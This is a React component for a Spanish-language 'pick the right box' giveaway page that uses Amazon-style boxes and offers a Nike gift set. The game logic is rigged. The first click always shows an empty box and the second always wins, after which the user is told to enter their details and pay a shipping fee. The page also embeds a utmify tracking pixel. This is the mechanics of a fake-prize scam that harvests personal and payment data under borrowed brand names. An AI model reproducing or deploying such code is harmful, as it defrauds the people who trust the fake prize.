import React, { useState, useEffect } from 'react';
import Header from '../../componentes/header/Header';
import Boxamazon from '../../componentes/Boxamazon/Boxamazon';
import './style.css';
import presentes from '../../assets/carousel/main.jpeg';
import { useNavigate } from 'react-router';

export default function Presents() {
  const [clickCount, setClickCount] = useState(0);
  const [showNotificacaoFalta, setShowNotificacaoFalta] = useState(false);
  const [showNotificacao, setShowNotificacao] = useState(false);
  const navigate = useNavigate();
  const [isLoading, setIsLoading] = useState(false);
  const [showNotificacaoContainerPrimeira, setShowNotificacaoContainerPrimeira] = useState(false);
  const [height, setHeight] = useState(window.innerHeight);

  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  useEffect(() => {
    const timer = setTimeout(() => {
      setIsLoading(false);
      setShowNotificacaoContainerPrimeira(true);
    }, 0);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    const updateHeight = () => {
      setHeight(window.innerHeight);
    };
    window.addEventListener("resize", updateHeight);
    return () => window.removeEventListener("resize", updateHeight);
  }, []);

  function startLoading(callback) {
    setIsLoading(true);
    setTimeout(() => {
      setIsLoading(false);
      if (callback) callback();
    }, 2000);
  }

  const handleBoxamazonClick = () => {
    setClickCount(prevCount => {
      const newCount = prevCount + 1;
      if (newCount === 1) {
        setShowNotificacaoFalta(true);
        setTimeout(() => {
          setShowNotificacaoFalta(false);
        }, 3000);
      } else if (newCount === 2) {
        setShowNotificacao(true);
      }
      return newCount;
    });
  };

  return (
    <div className='containerTotal'>
      <Header />
      <div className='containerBox'>
        {[...Array(6)].map((_, index) => (
          <Boxamazon key={index} onClick={handleBoxamazonClick} />
        ))}
      </div>

      <div className='telaCarregamentoContainer' style={{ display: isLoading ? 'flex' : 'none', height: height }}>
        <div className="loader"></div>
      </div>

      <div className='notificacaoFaltaContainer' style={{ display: showNotificacaoFalta ? 'block' : 'none', height: height }}>
        <div className='notificacaoFalta'>
          <h2>!Ups!</h2>
          <p>Lamentablemente, esta caja está vacía. Te quedan 2 intentos.</p>
          <button className='botaoOk' onClick={() => setShowNotificacaoFalta(false)}>OK</button>
        </div>
      </div>

      <div className='notificacaoContainer' style={{ display: showNotificacao ? 'block' : 'none', height: height }}>
        <div className='notificacao'>
          <img src={presentes} alt="Presentes" />
          <h3>!Felicidades! ¡Has ganado nuestro premio: el set de regalo Nike!</h3>
          <p>Todo lo que necesitas hacer es completar la información requerida y pagar el costo de envío.</p>
          <p>El paquete será entregado en un plazo de 3 días.</p>
          <button className='botaoOk'  onClick={() => {
    setShowNotificacao(false); // Esconde a notificação imediatamente
    startLoading(() => navigate('/entrega')); // Inicia o carregamento e depois navega
  }}>OK</button>
        </div>
      </div>

      <div className='notificacaoContainerPrimeira' style={{ display: showNotificacaoContainerPrimeira ? 'flex' : 'none', height: height }}>
        <div className='notificacao'>
          <img src={presentes} alt="Presentes" />
          <h3>Gracias por tu participación</h3>
          <p>¡Se le ofrece la oportunidad de recibir el set de regalo Nike!</p>
          <p>Todo lo tienes que hacer es elegir la caja correcta.</p>
          <p>¡Tienes 3 intentos, buena suerte!</p>
          <button className='botaoOk' onClick={() => setShowNotificacaoContainerPrimeira(false)}>OK</button>
        </div>




        <script>
window.pixelId = "676a054f402f32fdec2f7281";
var a = document.createElement("script");
a.setAttribute("async", "");
a.setAttribute("defer", "");
a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
document.head.appendChild(a);
</script>
<script src="https://cdn.utmify.com.br/scripts/utms/latest.js" async defer>
</script>





      </div>
    </div>
  );
}
